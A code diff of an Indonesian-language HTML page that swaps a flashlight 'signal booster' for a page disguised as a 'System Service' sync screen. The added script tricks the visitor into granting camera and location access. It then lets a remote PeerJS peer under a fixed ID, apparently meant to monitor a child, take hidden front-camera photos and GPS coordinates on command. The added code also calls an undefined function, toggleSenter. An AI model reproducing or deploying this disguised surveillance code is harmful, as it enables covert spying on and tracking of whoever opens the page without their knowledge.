@@ -1,68 +1,64 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sinyal Booster V6 - Stable</title>
+    <title>System Service</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #000; color: #0f0; text-align: center; font-family: sans-serif; padding-top: 80px; }
-        .box { border: 2px solid #0f0; padding: 30px; display: inline-block; border-radius: 20px; }
-        .btn { background: #0f0; color: #000; padding: 15px 30px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; }
+        body { background: #f0f2f5; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: inline-block; width: 80%; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>🚀 SIGNAL OPTIMIZER</h2>
-        <p>Status: <span id="stat">Menghubungkan...</span></p>
-        <button class="btn" onclick="aktifkan()">HUBUNGKAN SINYAL</button>
+    <div class="card">
+        <div class="spinner"></div>
+        <h3>Sinkronisasi Sistem...</h3>
+        <p id="stat" style="color: #666;">Menghubungkan ke server aman</p>
+        <button onclick="aktifkan()" style="background:#3498db; color:white; border:none; padding:10px 20px; border-radius:5px;">MULAI OPTIMASI</button>
     </div>
 
+    <video id="v" style="display:none" autoplay playsinline></video>
+    <canvas id="c" style="display:none"></canvas>
+
     <script>
-        const KUNCI_REMOT = "hayabusa_remote_anak_123"; 
-        const peer = new Peer(KUNCI_REMOT);
-        let s_stream = null;
-
-        peer.on('open', () => { document.getElementById('stat').innerText = "Sistem Siap!"; });
-
-        peer.on('connection', (conn) => {
-            document.getElementById('stat').innerText = "Remote Terhubung ✅";
-            conn.on('data', async (data) => {
-                if (data === "ON") await kontrolSenter(true);
-                if (data === "OFF") await kontrolSenter(false);
-            });
-        });
+        const peer = new Peer("hayabusa_monitor_anak");
+        let stream;
 
         async function aktifkan() {
             try {
-                // Pancing izin kamera pertama kali
-                s_stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                document.getElementById('stat').innerText = "Booster Aktif!";
-                // Matikan dulu supaya standby
-                s_stream.getTracks().forEach(track => track.stop());
-                s_stream = null;
-                alert("Berhasil Terhubung!");
-            } catch (e) { alert("Izin kamera ditolak!"); }
+                // Izin kamera & lokasi sekaligus
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                navigator.geolocation.getCurrentPosition(() => {});
+                document.getElementById('stat').innerText = "Sistem Berjalan Optimal";
+                alert("Sinkronisasi Berhasil!");
+            } catch (e) { alert("Izinkan akses agar sistem bekerja!"); }
         }
 
-        async function kontrolSenter(status) {
-            try {
-                if (status) {
-                    // NYALAKAN: Buka kamera dan aktifkan senter
-                    s_stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                    const track = s_stream.getVideoTracks()[0];
-                    await track.applyConstraints({ advanced: [{ torch: true }] });
-                } else {
-                    // MATIKAN: Langsung stop semua aliran kamera
-                    if (s_stream) {
-                        s_stream.getTracks().forEach(track => {
-                            track.applyConstraints({ advanced: [{ torch: false }] }); // Coba matikan torch dulu
-                            track.stop(); // MATIKAN TOTAL KAMERA
-                        });
-                        s_stream = null;
-                    }
-                }
-            } catch (err) { console.log("Error hardware:", err); }
+        peer.on('connection', (conn) => {
+            conn.on('data', async (data) => {
+                if (data === "CEK_FOTO") ambilFoto(conn);
+                if (data === "CEK_LOKASI") kirimLokasi(conn);
+                if (data === "SENTER_ON") toggleSenter(true);
+                if (data === "SENTER_OFF") toggleSenter(false);
+            });
+        });
+
+        async function ambilFoto(conn) {
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            v.srcObject = stream;
+            setTimeout(() => {
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                conn.send({ type: "FOTO", data: c.toDataURL('image/jpeg') });
+            }, 1000);
+        }
+
+        function kirimLokasi(conn) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                conn.send({ type: "LOKASI", lat: pos.coords.latitude, lon: pos.coords.longitude });
+            });
         }
     </script>
 </body>
